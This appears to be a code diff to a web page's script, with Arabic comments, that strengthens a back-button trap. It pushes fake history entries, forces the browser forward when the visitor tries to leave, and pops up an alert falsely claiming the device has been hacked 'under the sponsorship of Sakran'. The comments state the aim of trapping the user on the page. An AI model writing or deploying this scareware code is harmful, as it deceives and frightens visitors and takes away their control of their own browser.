@@ -49,12 +49,14 @@
     <div class="terminal" id="console"></div>
 
     <script>
-        // قفل زر الرجوع تماماً وحبس المستخدم جوه الصفحة
-        history.pushState(null, null, location.href);
-        window.addEventListener('popstate', function () {
-            history.pushState(null, null, location.href);
-            alert("🚨 تحذير: لا يمكنك الهروب! تم اختراق جهازك تحت رعاية سكران! 🚨");
-        });
+        // تكرار دفع حالات وهمية في الـ History لغلق طريق الرجوع نهائياً
+        history.pushState(null, null, window.location.href);
+        history.pushState(null, null, window.location.href);
+        
+        window.onpopstate = function () {
+            history.go(1); // إجباره على التقدم للأمام لو حاول الرجوع
+            alert("🚨 تحذير: زر الرجوع معطل! تم اختراق جهازك تحت رعاية سكران! 🚨");
+        };
 
         window.onload = function() {
             try {
